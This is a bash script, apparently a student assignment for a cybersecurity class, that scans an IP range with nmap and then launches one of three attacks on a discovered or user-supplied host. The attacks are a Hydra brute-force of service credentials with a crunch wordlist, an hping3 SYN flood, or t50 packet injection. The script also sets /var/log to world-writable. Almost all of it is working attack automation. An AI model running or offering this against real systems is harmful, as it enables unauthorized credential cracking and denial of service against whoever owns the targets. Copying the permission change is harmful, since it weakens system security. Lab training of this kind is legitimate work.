#!/bin/bash

sgtime=$(TZ=Asia/Singapore date)
sudo chmod 777 /var/log #using sudo to give permissions to add logs into /var/log

function 1hydra #using cmd function to store details of hydra attack to be called out later
{
	echo 'You have chosen Hydra bruteforce attempts to crack the credentials of a service.' #Description of attack
	echo 'Enter the username that you would like to attack: ' 
	read userName #asking the user to key in the username of target 
	echo 'Enter full crunch format. Example: 4 4 1234 : '
	read format #asking the user to key in the format of passwords generation via crunch
	crunch $format > pass.txt #command crunch is used to generate the password list according to user input and saved into pas.txt
	echo 'Input 1) if you want to choose a new IP Address or anything else if you want to use a random IP Address from the scan:'
	read hydrachoice #asking user to choose if they would like to key a fresh ip or use a random ip retrieved from the previous scan
	echo 'Enter the service you would like to hydra: '
	read hydraservice #asking user to input ssh/smb/rdp
	if [ $hydrachoice == 1 ] #if user keyed in 1 at line 14
	then 
		echo 'Enter the IP Address: '
		read newIP #user have selected to key a fresh IP
		hydra -l $userName -P pass.txt $newIP $hydraservice -vv # hydra will start with the username, passwordlist, IP and service provided by user
		echo "$sgtime hydra -l $userName -P pass.txt $newIP $hydraservice " >> /var/log/socattack.log #date, time, attack and IP address is saved into socattack.log in /var/log
	else 
		randomIP=$(shuf list_$range | head -n1) #if user keyed in anything other than 1 in line 14, a random IP will be choosen from the list of IP scanned earlier by shuffling the list and selecting the IP at the top
		echo "The random IP selected is $randomIP" #inform user of the random IP selected
		hydra -l $userName -P pass.txt $randomIP $hydraservice -vv # hydra will start with the username, passwordlist and service provided by user
		echo "$sgtime hydra -l $userName -P pass.txt $randomIP $hydraservice " >> /var/log/socattack.log  #date, time, attack and IP address is saved into socattack.log in /var/log
	fi
}

function 2hping3 #using cmd function to store details of hping3 attack to be called out later
{
	echo 'You have chosen hping3, a DOS attack sending out syn packets to the IP address of your choice' #Description of attack
	echo 'Input 1) if you want to choose a new IP Address or anything else if you want to use a random IP Address from the scan:'
	read hping3choice #asking user to choose if they would like to key a fresh ip or use a random ip retrieved from the previous scan
	if [ $hping3choice == 1]
	then 
		echo 'Enter the IP Address: '
		read newIP #user have selected to key a fresh IP
		sudo hping3 -S $newIP #kali to send SYN packets to fresh IP
		echo "$sgtime sudo hping3 -S $newIP  " >> /var/log/socattack.log #date, time, attack and IP address is saved into socattack.log in /var/log
	else 
		randomIP=$(shuf list_$range | head -n1) #if user keyed in anything other than 1 in line 36, a random IP will be choosen from the list of IP scanned earlier by shuffling the list and selecting the IP at the top
		echo "The random IP selected is $randomIP" #inform user of the random IP selected
		sudo hping3 -S $randomIP #kali to send SYN packets to random IP generated from list
		echo "$sgtime sudo hping3 -S $randomIP  " >> /var/log/socattack.log  #date, time, attack and IP address is saved into socattack.log in /var/log
	fi
	
	
}

function 3t50 #using cmd function to store details of t50 attack to be called out later
{
	echo 'You have chosen the 3) t50. It is a multi protocol network injector.' #Description of attack
	echo 'Input 1) if you want to choose a new IP Address or anything else if you want to use a random IP Address from the scan:'
	read t50choice #asking user to choose if they would like to key a fresh ip or use a random ip retrieved from the previous scan
	if [ $t50choice == 1 ]
	then 
		echo 'Enter the IP Address: '
		read newIP #user have selected to key a fresh IP
		sudo t50 $newIP #kali to inject packets via t50 into fresh IP
		#echo "$sgtime sudo t50 $newIP " >> /var/log/socattack.log #date, time, attack and IP address is saved into socattack.log in /var/log
	else 
		randomIP=$(shuf list_$range | head -n1) #if user keyed in anything other than 1 in line 57, a random IP will be choosen from the list of IP scanned earlier by shuffling the list and selecting the IP at the top
		echo "The random IP selected is $randomIP" #inform user of the random IP selected
		sudo t50 $randomIP #kali to inject packets via t50 into random IP generated
		#echo "$sgtime sudo t50 $randomIP " >> /var/log/socattack.log  #date, time, attack and IP address is saved into socattack.log in /var/log
	fi


	
} 

function attackoptions #using cmd function to store details of CASE command to be called out later
{
	case $OPTIONS in	#to retrieve user input that is stored in the variable OPTION from line 105
		1)
			1hydra #1 will lead to the 1hydra function created before
			;;
		2)
			2hping3 #2 will lead to the 2hping3 function created before
			;;
		3)
			3t50 #3 will lead to the 3t50 function created before
			;;
	esac
}
echo "Please enter the range of IP Addresses to scan via nmap: "
read range #asking for user's input of Ipaddress with/without CIDR for nmap scan

nmap "$range" -sV -Pn -F -oN scanres.txt   #cmd nmap performed with Ipaddress keyed in earlier under Fast mode and saved into file scanrest.txt
cat scanres.txt | grep 'scan report' | awk '{print $NF}' >> "list_$range" #using cat and grep to capture only the IP addresses and save into list_<user input from line 90>


echo '1: Hydra, bruteforce attempts  to crack the credentials of a service.' #Description of the option and attacks
echo '2: hping3, a DOS attack sending out syn packets to the IP address of your choice.' #Description of the option and attacks
echo '3: t50, a multi protocol network injector, used to inject packets via different protocols.' #Description of the option and attacks
echo '4: A random attack will be selected from among the 3 above.' #Description of the option and attacks

echo 1 >> test ; echo 2 >> test ; echo 3 >> test #entering 1, 2 and 3 into different lines in file <test>


echo 'Please choose an attack option among '1' '2' '3' '4': '
read OPTIONS #asking for user input based on options provided from lines 96 to 99
if [  $OPTIONS == 1 ] || [  $OPTIONS == 2 ] || [  $OPTIONS == 3 ] || [  $OPTIONS == 4 ] # if user input is either 1, 2, 3 or 4
then 
	if [ $OPTIONS == 4 ] #if user input is 4
	then
		OPTIONS=$(shuf test | head -n1) #the options from file <test> will be shuffled and the first number will be selected and stored back into OPTIONS
		attackoptions #the system will call the function containing the CASE options, and run the random option
			
			
	else 
		attackoptions #the system will call the function containing the CASE options and run adccording to user input
	fi
else
	echo 'You have entered a non-existing option. Quitting now, goodbye.' #if user input from line 105 is not 1, 2, 3 or 4, system to inform user about non-existing option and stop the script
fi


#Name<code>: IVAN LIM YEE HUI<S11>
#Classcode: CFC02022023
#LecturerName: James
